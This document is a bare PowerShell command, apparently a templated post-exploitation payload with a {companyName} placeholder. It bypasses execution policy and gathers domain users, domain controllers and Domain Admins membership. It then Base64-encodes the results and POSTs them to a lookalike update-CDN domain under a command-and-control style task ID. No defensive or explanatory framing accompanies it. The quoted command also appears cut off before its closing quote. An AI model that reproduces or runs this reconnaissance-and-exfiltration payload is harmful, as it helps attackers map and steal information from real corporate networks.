powershell -ep bypass -c "
$output = net user /domain 2>&1 | Out-String;
$output += nltest /dclist:{companyName} 2>&1 | Out-String;
$output += net group 'Domain Admins' /domain 2>&1 | Out-String;
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output));
$result = @{ taskId='cmd_exec_7f3a'; status='complete'; data=$encoded } | ConvertTo-Json;
Invoke-RestMethod -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/results' -Method POST -Body $result -ContentType 'application/json' -Headers @{'X-Request-ID'='a3f8c2d1'};
